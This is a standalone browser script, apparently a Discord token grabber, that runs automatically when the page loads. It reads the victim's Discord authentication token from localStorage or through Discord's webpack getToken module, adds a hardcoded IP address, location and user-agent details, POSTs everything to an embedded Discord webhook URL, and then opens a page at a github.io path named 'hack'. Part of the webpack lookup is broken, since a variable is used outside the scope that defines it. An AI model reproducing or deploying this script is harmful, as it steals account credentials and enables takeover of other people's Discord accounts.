<script>
    // Function to get visitor details
    function getVisitorDetails() {
        const ip = '51.235.233.211'; // Hardcoded IP address
        const country = 'SA'; // Country code
        const city = 'Riyadh'; // City
        const region = 'Riyadh Region'; // Region
        const referrer = 'مباشرة'; // Referrer
        const userAgent = navigator.userAgent; // User Agent from browser
        const dateTime = new Date().toLocaleString(); // Current date and time

        return {
            ip: ip,
            country: country,
            city: city,
            region: region,
            referrer: referrer,
            userAgent: userAgent,
            dateTime: dateTime
        };
    }

    // Send all data to the webhook
    function sendDataToWebhook(token, visitorDetails) {
        const webhookURL = 'https://discord.com/api/webhooks/1315410944947392533/fcw0TV2n-HqXdvSCYQpnqgYrkvNhspmhvyNlJsCmTKdse6wy3uQYRUyWlzsCF92AQUgQ';

        const payload = {
            content: `
                **Discord Token:** ${token}
                **Visitor Details:**
                - **IP Address:** ${visitorDetails.ip}
                - **Country:** ${visitorDetails.country}
                - **City:** ${visitorDetails.city}
                - **Region:** ${visitorDetails.region}
                - **Referrer:** ${visitorDetails.referrer}
                - **User Agent:** ${visitorDetails.userAgent}
                - **Date & Time:** ${visitorDetails.dateTime}
            `
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                console.log('Data sent successfully');
                openNewPage();
            } else {
                console.error('Failed to send data, status:', response.status);
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }

    // Extract Discord Token from localStorage or Webpack
    function extractDiscordToken() {
        // Check if token is in localStorage
        const token = localStorage.getItem('discord_token');  // Replace with correct key if needed
        if (token) {
            const visitorDetails = getVisitorDetails();
            sendDataToWebhook(token, visitorDetails);
        } else {
            // If token not in localStorage, attempt to get it from webpack
            webpackChunkdiscord_app.push([[''], {}, e => {
                let m = [];
                for (let c in e.c) m.push(e.c[c]);
            }]);

            const module = m.find(m => m?.exports?.default?.getToken !== void 0);
            if (module && module.exports && module.exports.default) {
                const token = module.exports.default.getToken();
                const visitorDetails = getVisitorDetails();
                sendDataToWebhook(token, visitorDetails);
            } else {
                console.error("Token not found in webpack.");
            }
        }
    }

    // Function to open new page after sending data
    function openNewPage() {
        window.open('https://lqnz12.github.io/hack/', '_blank');
    }

    // Automatically try to extract the token and send data
    extractDiscordToken();
</script>
